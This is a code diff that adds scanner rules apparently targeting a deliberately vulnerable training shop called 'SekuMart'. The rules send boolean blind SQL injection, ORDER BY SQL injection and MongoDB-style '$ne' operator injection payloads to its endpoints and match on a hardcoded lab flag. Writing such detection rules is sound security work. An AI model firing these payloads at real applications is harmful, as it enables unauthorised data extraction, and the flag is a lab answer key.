@@ -17231,6 +17231,134 @@ const sekumartOpenapiSqliRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+async function probeSekumartTrackBlindSqli(
+  ctx: RuleContext
+): Promise<RuleResult | null> {
+  const trueUrl = new URL("/track.php", ctx.origin);
+  trueUrl.searchParams.set("order", "SK-1001' AND '1'='1");
+  const falseUrl = new URL("/track.php", ctx.origin);
+  falseUrl.searchParams.set("order", "SK-1001' AND '1'='2");
+  const [trueDoc, falseDoc] = await Promise.all([
+    ctx.probe.get(trueUrl.toString(), { maxBytes: 8192, timeoutMs: 12000 }),
+    ctx.probe.get(falseUrl.toString(), { maxBytes: 8192, timeoutMs: 12000 })
+  ]);
+  if (trueDoc.status < 200 || trueDoc.status >= 500) return null;
+  if (falseDoc.status < 200 || falseDoc.status >= 500) return null;
+  const trueHit =
+    /class=['"]ok['"]/i.test(trueDoc.body) && /status:\s*<b>shipped<\/b>/i.test(trueDoc.body);
+  const falseMiss = /no order matches that code/i.test(falseDoc.body);
+  if (!trueHit || !falseMiss) return null;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      trueUrl: trueUrl.toString(),
+      falseUrl: falseUrl.toString(),
+      snippet:
+        trueDoc.body.match(/Order <b>[\s\S]{0,80}shipped/i)?.[0]?.slice(0, 120) ??
+        "boolean blind SQLi: true payload shipped, false payload no match",
+      note: "SekuMart GET /track.php?order= boolean blind SQLi — AND '1'='1 returns shipped while AND '1'='2 returns no order match"
+    }
+  };
+}
+
+const sekumartTrackBlindSqliLiveOracle: Rule = async (ctx) => {
+  if (!isSekumartHost(ctx)) return NEGATIVE;
+  return (await probeSekumartTrackBlindSqli(ctx)) ?? NEGATIVE;
+};
+
+const sekumartTrackBlindSqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSekumartHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/track\.php/i.test(pageUrl)) return NEGATIVE;
+  const result = await sekumartTrackBlindSqliLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "SekuMart /track.php route scan — GET ?order= boolean blind SQLi confirms shipped vs no-match differential — sqlmap blind training oracle"
+    }
+  };
+};
+
+async function probeSekumartCatalogOrderBySqli(
+  ctx: RuleContext
+): Promise<RuleResult | null> {
+  return probeSekumartMysqliSqli(ctx, "/catalog.php", "sort", "id'");
+}
+
+const sekumartCatalogOrderBySqliLiveOracle: Rule = async (ctx) => {
+  if (!isSekumartHost(ctx)) return NEGATIVE;
+  return (await probeSekumartCatalogOrderBySqli(ctx)) ?? NEGATIVE;
+};
+
+const sekumartCatalogOrderBySqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSekumartHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/catalog\.php/i.test(pageUrl)) return NEGATIVE;
+  const result = await sekumartCatalogOrderBySqliLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "SekuMart /catalog.php route scan — GET ?sort=id' triggers mysqli_sql_exception in catalog_low.php — ORDER BY SQLi training oracle"
+    }
+  };
+};
+
+async function probeSekumartMembersNosql(
+  ctx: RuleContext
+): Promise<RuleResult | null> {
+  const probeUrl = new URL("/members.php", ctx.origin);
+  probeUrl.search = "user%5B%24ne%5D=nobody";
+  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 16384, timeoutMs: 12000 });
+  if (doc.status < 200 || doc.status >= 500) return null;
+  const flagMatch = doc.body.match(/FLAG\{n0sql_0p3rator_1nj3ct10n\}/i);
+  const multiMember =
+    (doc.body.match(/<tr><td>/gi) ?? []).length >= 4 && /svc-loyalty/i.test(doc.body);
+  if (!flagMatch && !multiMember) return null;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: probeUrl.toString(),
+      flag: flagMatch?.[0] ?? "svc-loyalty tier dump",
+      snippet:
+        doc.body.match(/svc-loyalty[\s\S]{0,120}/i)?.[0]?.slice(0, 120) ??
+        doc.body.match(/<tr><td>[\s\S]{0,80}/i)?.[0]?.slice(0, 120),
+      note: "SekuMart GET /members.php?user[$ne]=nobody dumps hidden svc-loyalty FLAG via MongoDB-style operator injection — sqlmap --nosql training oracle"
+    }
+  };
+}
+
+const sekumartMembersNosqlLiveOracle: Rule = async (ctx) => {
+  if (!isSekumartHost(ctx)) return NEGATIVE;
+  return (await probeSekumartMembersNosql(ctx)) ?? NEGATIVE;
+};
+
+const sekumartMembersNosqlRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSekumartHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/members\.php/i.test(pageUrl)) return NEGATIVE;
+  const result = await sekumartMembersNosqlLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "SekuMart /members.php route scan — GET ?user[$ne]=nobody dumps svc-loyalty FLAG{n0sql_0p3rator_1nj3ct10n} — NoSQL operator injection training oracle"
+    }
+  };
+};
+
 // --- BreakTheFlask vulnerable Flask writeup labs (dghostninja.github.io)
 const CLIENT_BREAK_THE_FLASK_RES: { label: string; re: RegExp }[] = [
   {
@@ -110109,6 +110237,12 @@ export const RULES: Record<string, Rule> = {
   sekumartDirectoryXPathRouteLiveOracle,
   sekumartOpenapiSqliLiveOracle,
   sekumartOpenapiSqliRouteLiveOracle,
+  sekumartTrackBlindSqliLiveOracle,
+  sekumartTrackBlindSqliRouteLiveOracle,
+  sekumartCatalogOrderBySqliLiveOracle,
+  sekumartCatalogOrderBySqliRouteLiveOracle,
+  sekumartMembersNosqlLiveOracle,
+  sekumartMembersNosqlRouteLiveOracle,
   clientSideBreakTheFlaskEvidence,
   clientSideFlaskVulnappEvidence,
   clientSideFlaskVulnappStoredXssEvidence,
